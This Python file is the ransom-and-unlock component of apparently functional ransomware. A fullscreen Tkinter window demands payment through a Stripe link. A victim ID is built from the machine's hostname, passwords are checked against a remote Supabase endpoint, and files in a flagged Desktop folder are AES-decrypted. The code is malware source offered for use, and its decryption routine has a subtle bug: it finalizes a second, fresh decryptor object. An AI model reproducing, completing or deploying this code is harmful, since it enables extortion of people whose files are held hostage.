import os, sys, requests, platform, uuid, webbrowser, tkinter as tk
from tkinter import messagebox
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend

SERVER_URL = "https://qlvtkhpjazvwfnqzoqjr.supabase.co/functions/v1/verify-password"
PAYMENT_URL = "https://buy.stripe.com/test_3cI3cvghYcqiaMs7Pn4Rq00"

# ----- Crypto -----
def generate_key(password: str, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(), length=32, salt=salt,
        iterations=100000, backend=default_backend()
    )
    return kdf.derive(password.encode())

def decrypt_file(fp: str, password: str):
    with open(fp, "rb") as f:
        salt, iv, enc = f.read(16), f.read(16), f.read()
    key = generate_key(password, salt)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor().update(enc) + cipher.decryptor().finalize()
    unpad = padding.PKCS7(128).unpadder()
    data = unpad.update(dec) + unpad.finalize()
    open(fp, "wb").write(data)

def decrypt_directory(path: str, password: str):
    for root, _, files in os.walk(path):
        for f in files:
            if f == ".encrypted_flag": continue
            try:
                decrypt_file(os.path.join(root, f), password)
                print(f"[✓] Decrypted: {f}")
            except Exception as e:
                print(f"[!] Failed {f}: {e}")
    flag = os.path.join(path, ".encrypted_flag")
    if os.path.exists(flag): os.remove(flag)

# ----- Remote check -----
def verify_password(user_id: str, password: str) -> bool:
    r = requests.post(SERVER_URL, json={"user_id": user_id, "password": password})
    r.raise_for_status()
    return r.json().get("valid", False)

# ----- User ID -----
def get_or_create_user_id() -> str:
    id_file = os.path.expanduser("~/.user_id")
    if os.path.exists(id_file):
        return open(id_file).read().strip()

    base = platform.node()
    unique_suffix = str(uuid.uuid4())
    user_id = f"{base}_{unique_suffix}"

    with open(id_file, "w") as f:
        f.write(user_id)

    return user_id

import webbrowser

# ----- Tkinter GUI -----
def password_window(user_id: str, target_folder: str):
    def open_link(url: str):
        webbrowser.open_new(url)

    def on_submit():
        pw = entry.get()
        if not pw:
            msg_var.set("⚠️ Please enter a password.")
            return

        msg_var.set("🔍 Verifying password with server...")
        window.update_idletasks()

        if verify_password(user_id, pw):
            decrypt_directory(target_folder, pw)
            msg_var.set("✅ Password correct. Files decrypted successfully!")
        else:
            msg_var.set("❌ Invalid password. Try again.")

    window = tk.Tk()
    window.title("Decryption Tool")
    window.attributes("-fullscreen", True)   # Full screen

    # allow ESC to exit fullscreen/close
    def on_escape(event=None):
        window.destroy()
    window.bind("<Escape>", on_escape)

    frame = tk.Frame(window, bg="#1e1e1e")
    frame.pack(expand=True, fill="both")

    tk.Label(frame, text="🔐 Enter Decryption Password",
             font=("Helvetica", 36, "bold"), fg="white", bg="#1e1e1e").pack(pady=60)

    entry = tk.Entry(frame, show="*", font=("Helvetica", 28), width=30, justify="center")
    entry.pack(pady=20)
    entry.focus()

    tk.Button(frame, text="Submit", command=on_submit,
              font=("Helvetica", 24, "bold"), bg="#007acc", fg="white",
              relief="flat", padx=30, pady=10).pack(pady=40)

    # Inline message + clickable "here" link (same row)
    inline = tk.Frame(frame, bg="#1e1e1e")
    inline.pack(pady=10)

    msg_var_pay = tk.StringVar(value="Pay ")
    tk.Label(inline, textvariable=msg_var_pay, font=("Helvetica", 20),
             fg="lightgray", bg="#1e1e1e").pack(side="left")

    link = tk.Label(inline, text="here", font=("Helvetica", 20, "underline"),
                    fg="#1e90ff", bg="#1e1e1e", cursor="hand2")
    link.pack(side="left", padx=(6,0))
    link.bind("<Button-1>", lambda e: open_link(PAYMENT_URL))
    link.bind("<Enter>", lambda e: link.config(fg="#63b3ff"))
    link.bind("<Leave>", lambda e: link.config(fg="#1e90ff"))

    tk.Label(inline, text=" to get your password!", font=("Helvetica", 20),
             fg="lightgray", bg="#1e1e1e").pack(side="left", padx=(6,0))

    # Status message area
    msg_var = tk.StringVar(value="Please enter your password to unlock files.")
    tk.Label(frame, textvariable=msg_var, font=("Helvetica", 20),
             fg="lightgray", bg="#1e1e1e").pack(pady=20)

    tk.Button(frame, text="Exit", command=window.destroy,
              font=("Helvetica", 18), bg="red", fg="white",
              relief="flat", padx=20, pady=5).pack(side="bottom", pady=40)

    window.mainloop()


# ----- Main -----
if __name__ == "__main__":
    user_id = get_or_create_user_id()
    print(f"User ID: {user_id}")

    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    target_folder = os.path.join(desktop, "personal_Fa0337")
    if not os.path.exists(target_folder):
        print("Folder not found.")
        sys.exit(1)

    if not os.path.exists(os.path.join(target_folder, ".encrypted_flag")):
        print("No encrypted files found.")
        sys.exit(1)

    password_window(user_id, target_folder)
